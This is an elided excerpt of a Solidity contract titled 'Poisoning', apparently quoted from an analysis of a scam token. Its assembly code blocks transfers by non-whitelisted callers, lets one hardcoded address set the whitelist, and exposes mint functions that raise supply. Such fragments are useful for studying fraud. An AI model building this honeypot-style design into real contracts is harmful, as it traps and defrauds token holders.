...
contract Poisoning {
    ...
    function isWhitelist(address) external view returns (bool) {
        assembly {
            ...
            mstore(freeMemPtr, _addr)
            mstore(add(freeMemPtr, 0x20), 0x02)

            let addrSlot := keccak256(freeMemPtr, 0x40)
            let addrIsWhitelist := sload(addrSlot)

            mstore(freeMemPtr, addrIsWhitelist)
            return (freeMemPtr, 0x20)
        }
    }
    ...
    function transfer(address, uint256) external returns (bool success) {
        ...
        //check caller in whitelist
            ...
            if iszero(eq(addrIsWhitelist, 0x1)) {
                revert(0, 0)
            }
    ...
    function setWhitelist(address[] memory list) external {
        assembly {
            if iszero(eq(caller(), 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }
    ...
    function batchMint(address[] memory recipients, uint256 amount) external {
        assembly {
            ...
            let newSupply := add(totalAmounts, sload(0x03))
    ...
    function mint(address to, uint256 amount) external {
        assembly {
            ...
            let newSupply := add(amount, sload(0x03))
            sstore(0x03, newSupply)
